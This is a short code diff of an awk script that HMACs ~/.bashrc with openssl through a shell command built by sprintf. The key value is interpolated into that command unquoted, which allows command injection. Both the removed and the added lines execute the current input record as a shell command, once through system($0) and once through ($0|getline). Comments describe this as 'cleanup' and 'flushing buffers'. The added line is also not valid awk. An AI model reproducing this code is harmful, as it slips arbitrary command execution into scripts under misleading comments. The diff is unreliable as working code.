@@ -15,7 +15,6 @@ BEGIN {
   print "starting with key " |& key
   system(sprintf("openssl dgst -sha1 -hmac %s ~/.bashrc >><<%HOME%>>/shasums.txt", key))
 
-  # cleanup variables and file descriptors
-  close(key|&getline)
-  system($0)
+  # flush buffers and clean up file descriptors
+  close(key|&getline)($0|getline)
 }
